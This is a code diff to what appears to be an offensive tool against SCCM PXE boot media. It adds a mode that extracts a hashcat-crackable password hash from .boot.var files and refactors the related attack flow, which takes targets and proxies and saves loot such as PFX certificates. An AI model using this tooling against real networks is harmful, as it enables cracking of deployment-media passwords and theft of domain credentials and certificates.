@@ -2,6 +2,7 @@ from lib.policy import PolicyRetriever
 import argparse
 import binascii
 import os
+import struct
 import xml.etree.ElementTree as ET
 
 # Parse arguments
@@ -22,6 +23,10 @@ decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt a locally downlo
 decrypt_parser.add_argument("file", help="Path to the .boot.var file")
 decrypt_parser.add_argument("key", help="Decryption key (hex)")
 decrypt_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
+
+# Hash mode — extract SCCM hash from local .boot.var file
+hash_parser = subparsers.add_parser("hash", help="Extract SCCM hashcat hash from a local .boot.var file")
+hash_parser.add_argument("file", help="Path to the .boot.var file")
 
 # Loot mode — extract PFX and info from already-decrypted XML
 loot_parser = subparsers.add_parser("loot", help="Extract PFX cert and info from decrypted media variables XML")
@@ -57,6 +62,25 @@ policies_local_parser.add_argument(
 policies_local_parser.add_argument("-o", "--output", help="Output directory for decrypted policy files", type=str, default="./loot")
 
 args = parser.parse_args()
+
+
+def detect_media_encryption_type(filedata):
+    """Detect AES-128 or AES-256 from .boot.var header ALG_ID."""
+    header = filedata[:40]
+    if len(header) < 40:
+        raise ValueError("Media variable file is too short to contain a valid header")
+    alg_id = struct.unpack_from("<I", header, 16)[0]
+    if alg_id == 0x660E:
+        return 128
+    if alg_id == 0x6610:
+        return 256
+    return None
+
+
+def build_sccm_hash(filedata):
+    aes_bits = detect_media_encryption_type(filedata)
+    aes_label = f"aes{aes_bits}" if aes_bits else "aes128"
+    return f"$sccm${aes_label}${filedata[:40].hex()}", aes_bits
 
 def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
     """Extract PFX cert and key info from decrypted media variables."""
@@ -123,6 +147,21 @@ if args.mode == "decrypt":
         print(f"[!] Decryption failed: {e}")
     exit()
 
+if args.mode == "hash":
+    try:
+        with open(args.file, "rb") as f:
+            filedata = f.read()
+        hashcat_hash, aes_bits = build_sccm_hash(filedata)
+        if aes_bits:
+            print(f"[*] Detected encryption: AES-{aes_bits}")
+        else:
+            print("[!] Unknown encryption algorithm in header; defaulting hash label to aes128")
+        print("[*] Hashcat hash:")
+        print(hashcat_hash)
+    except Exception as e:
+        print(f"[!] Failed to extract hash: {e}")
+    exit()
+
 # Attack mode
 if args.target == None or args.socks_host == None or args.socks_port == None or args.src_ip == None:
     print("Usage: python3 main.py <target> <src_ip> <socks_host> <socks_port>")
@@ -168,10 +207,8 @@ if data_variables is None:
 if cryptokey is None:
     # Password IS set — no crypto key in DHCP response, need to crack the hash
     print("[*] PXE media is password-protected (no crypto key in DHCP response)")
-    aes_bits = sccm_client.detect_encryption_type(data_variables)
-    aes_label = f"aes{aes_bits}" if aes_bits else "aes128"
+    hashcat_hash, aes_bits = build_sccm_hash(data_variables)
     print(f"[*] Detected encryption: AES-{aes_bits or 128}")
-    hashcat_hash = f"$sccm${aes_label}${sccm_client.read_media_variable_file_header(data_variables).hex()}"
 
     if args.password:
         print("[*] Decrypting media file with supplied password...")
